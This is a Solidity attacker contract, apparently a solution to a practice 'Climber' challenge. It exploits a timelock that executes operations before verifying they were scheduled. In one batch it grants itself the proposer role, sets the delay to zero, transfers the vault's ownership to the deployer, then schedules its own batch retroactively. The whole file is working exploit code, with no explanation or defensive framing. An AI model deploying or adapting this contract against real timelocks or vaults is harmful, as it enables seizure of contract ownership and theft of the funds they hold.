// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import "./ClimberVault.sol";

contract ClimberTimelockAttacker {
    address payable public timelock;

    uint256[] private _values = [0, 0, 0, 0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] =
            (abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[3] = abi.encodeWithSignature("schedule()");
    }

    function execute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, "");
    }

    function schedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, "");
    }
}
